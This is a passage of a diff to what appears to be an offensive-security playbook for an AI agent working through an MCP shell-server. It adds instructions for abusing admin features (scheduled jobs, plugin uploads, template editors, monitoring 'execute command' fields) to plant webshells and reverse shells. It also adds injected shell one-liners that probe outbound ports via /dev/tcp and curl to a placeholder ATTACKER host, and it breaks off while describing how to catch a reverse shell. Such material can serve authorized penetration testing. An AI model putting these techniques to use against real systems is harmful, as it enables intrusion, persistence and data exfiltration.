@@ -400,13 +400,58 @@ w^h^o^a^m^i
 n^e^t u^s^e^r
 ```
 
-## Step 7: Escalate or Pivot
+## Step 7: Application-Feature Command Execution
+
+When you have admin/superadmin access to a web application, look for
+**legitimate features that execute system commands** — these aren't injection
+bugs, they're intended functionality you can abuse.
+
+Common patterns:
+- **Filter/rule systems with execute actions** — monitoring tools (Nagios,
+  Zabbix, Icinga), CI/CD systems, SIEM platforms. Look for fields named
+  "execute command", "run script", "action command", "notification command".
+  These often run via background daemons (cron-like), not inline — you may
+  need to wait for the daemon cycle or trigger an event.
+- **Scheduled tasks / cron features** — CMS platforms, admin panels, backup
+  tools. Create or edit a scheduled job with a reverse shell payload.
+- **Plugin/extension installation** — WordPress, Joomla, Grafana. Upload a
+  malicious plugin ZIP containing a webshell or reverse shell.
+- **Template/theme editing** — CMS template editors that write PHP/Python/Ruby
+  directly to disk. Edit a template to include command execution.
+- **Backup/restore with code execution** — restore a crafted backup containing
+  a webshell or modified config that executes commands.
+- **Notification/webhook systems** — set a command-based notification triggered
+  by an event you can create.
+
+**Key difference from injection:** You're not breaking out of a command — you're
+providing the entire command to a feature designed to run it. No operators or
+escaping needed, just a valid shell command.
+
+**Trigger mechanisms:** Background daemon features (filters, notifications) may
+require an event to fire. Check how to create or simulate the triggering
+condition (create a matching record, force an alarm, trigger a threshold).
+
+## Step 8: Escalate or Pivot
 
 ### Reverse Shell via MCP
 
 When RCE is confirmed, **prefer catching a reverse shell via the MCP
 shell-server** over continuing to inject commands through the injection
 parameter.
+
+**Verify egress first.** Before starting a listener, test outbound
+connectivity from the target. Egress firewalls are common — blind reverse
+shell attempts waste time when ports are blocked:
+
+```bash
+# Test common egress ports (inject via confirmed operator)
+; for p in 443 8080 8443 8888 4444 53; do bash -c "echo test > /dev/tcp/ATTACKER/$p" 2>/dev/null && echo "PORT $p OPEN"; done
+# Or use curl if available
+; curl -s http://ATTACKER:PORT/egress-test --max-time 3
+```
+
+Use the first port that succeeds. If no ports work, fall back to inline
+command execution or DNS/ICMP exfiltration.
 
 1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
 2. Send a reverse shell payload through the injection parameter:
